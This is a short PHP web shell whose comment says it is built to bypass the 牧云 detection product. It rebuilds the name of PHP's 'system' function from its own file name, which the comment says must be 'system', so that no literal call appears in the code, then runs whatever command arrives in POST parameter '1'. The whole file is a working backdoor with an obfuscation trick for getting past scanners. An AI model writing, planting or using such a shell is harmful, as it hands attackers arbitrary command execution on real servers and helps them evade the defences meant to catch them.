<?php
//bypass 牧云 文件名需要设置为system
$filename=substr(__FILE__,-10,6);
$command=$_POST[1];
$filename($command);
